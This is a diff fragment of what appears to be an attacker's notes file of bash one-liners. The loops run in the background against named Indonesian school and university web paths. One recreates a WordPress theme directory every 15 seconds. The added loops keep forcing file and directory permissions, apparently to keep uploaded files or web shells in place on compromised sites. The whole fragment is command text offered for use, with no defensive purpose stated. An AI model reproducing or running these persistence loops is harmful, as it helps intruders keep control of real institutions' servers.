@@ -9,3 +9,10 @@ bash -c 'while true; do if [ ! -f "/var/www/html/repository.stembi.ac.id/htdocs/
 auto upload directory :
 ======================================================
 bash -c 'while true; do if [ ! -d "/home/smkngunu/subdomains/lms.smkn1gunungtuleh.sch.id/wp-content/themes/twentytwenty/assets/images/" ]; then mkdir /home/smkngunu/subdomains/lms.smkn1gunungtuleh.sch.id/wp-content/themes/twentytwenty/assets/images/ ; fi; sleep 15; done' &
+
+
+auto upload chmod 755 / 644 :
+======================================================
+while true; do find /path/to/directory -type f ! -perm 644 -exec chmod 755 {} \;; sleep 5; done
+
+while true; do find /path/to/directory -type d ! -perm 755 -exec chmod 755 {} \;; sleep 5; done
